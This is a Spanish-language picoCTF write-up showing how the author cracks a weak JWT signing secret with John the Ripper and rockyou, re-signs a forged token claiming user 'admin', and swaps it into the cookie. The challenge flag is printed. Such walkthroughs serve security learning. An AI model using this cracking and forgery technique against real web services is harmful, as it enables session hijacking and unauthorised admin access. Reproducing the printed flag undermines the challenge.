## Descripcion 

¡Consulta el bloc de notas del administrador! https://jupiter.challenges.picoctf.org/problem/61864/ o http://jupiter.challenges.picoctf.org:61864
## Solucion

En la cookie vemos en jwt, se divide en tres partes

logearse con cualquier nombre
copiamos el jwt
en jwt.io

┌──(kali㉿kali)-[~]
└─$ nano crack
┌──(kali㉿kali)-[~]
└─$ cat crack                                                                                             
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTWVzc2kifQ.Xri9D0_l3ZMLRpxiTUEBOJ4sqw9GflF-sl96SK0ZFxk          
┌──(kali㉿kali)-[~]
└─$ 
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ sudo gzip -d rockyou.txt 
[sudo] password for kali:                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ 
┌──(kali㉿kali)-[~]
└─$ john crack -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:02 DONE (2024-03-04 14:16) 0.3759g/s 2780Kp/s 2780Kc/s 2780KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
      
┌──(kali㉿kali)-[~]
└─$ 

Modificamos que diga user = admin en jwt.io

{
  "user": "admin"
}

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  ilovepico
) secret base64 encoded


///en el cookie y lo pasamos a la cookie de la pagina

picoCTF{jawt_was_just_what_you_thought_1ca14548}


## Notas adicionales
